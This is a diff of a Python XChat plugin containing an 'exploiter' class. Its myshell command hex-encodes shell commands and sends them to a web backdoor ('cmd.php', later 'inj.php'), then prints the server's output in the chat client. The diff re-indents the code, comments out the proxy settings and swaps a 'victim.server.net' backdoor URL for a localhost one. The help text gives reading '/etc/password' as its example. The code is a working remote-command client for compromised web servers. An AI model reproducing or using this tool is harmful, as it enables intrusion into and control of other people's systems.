@@ -60,12 +60,12 @@ class exploiter(multi):
 	self.target=target
 	self.modproxy=False
 
-   def setProxy(self, proxy, port):
+    def setProxy(self, proxy, port):
 	self.proxy = proxy
 	self.port = port
 
 
-   def enableProxy(self):
+    def enableProxy(self):
 	self.modproxy=True
 
 
@@ -127,30 +127,30 @@ class exploiter(multi):
                  finished = 0
        return text
 
-def myshell(words, word_eol, userdata):
+    def myshell(words, word_eol, userdata):
 
-    # define the proxy and proxy's port, also the url where reside our backdoor
-    proxy="proxy.server.com"
-    port=3128
-    url="http://victim.server.net/cmd.php?md"
+        # define the proxy and proxy's port, also the url where reside our backdoor
+        #proxy="proxy.server.com"
+        #port=3128
+        url="http://localhost/inj.php?md"
 
-    stat = exploiter(exploit="",target="")
-    stat.setProxy(proxy, port):
+        stat = exploiter(exploit="",target="")
+        #stat.setProxy(proxy, port):
 
-    prompt=url.split('/')[2]
-    prompt =  '['+prompt+']$ '
-    if len(words) > 1: 
-        cmd=stat.toHex(words[1:])
-        print ""
-        data=stat.__get_site__(url+cmd)
-        data=stat.StripTags(data)
-        xchat.prnt(stat.html_to_text(data))
-        print prompt+str(words[1:][0])
+        prompt=url.split('/')[2]
+        prompt =  '['+prompt+']$ '
+        if len(words) > 1: 
+           cmd=stat.toHex(words[1:])
+           print ""
+           data=stat.__get_site__(url+cmd)
+           data=stat.StripTags(data)
+           xchat.prnt(stat.html_to_text(data))
+           print prompt+str(words[1:][0])
         
         
-    else:
-         print "Help: /py99 [cmd] "
-         print "Example: /py99 'cat /etc/password'"
+        else:
+           print "Help: /py99 [cmd] "
+           print "Example: /py99 'cat /etc/password'"
 
 xchat.hook_command("py99", myshell, help="py99 [cmd]")
 print "Module \"%s\" v.%s loaded correctly!" % (__module_name__,__module_version__)
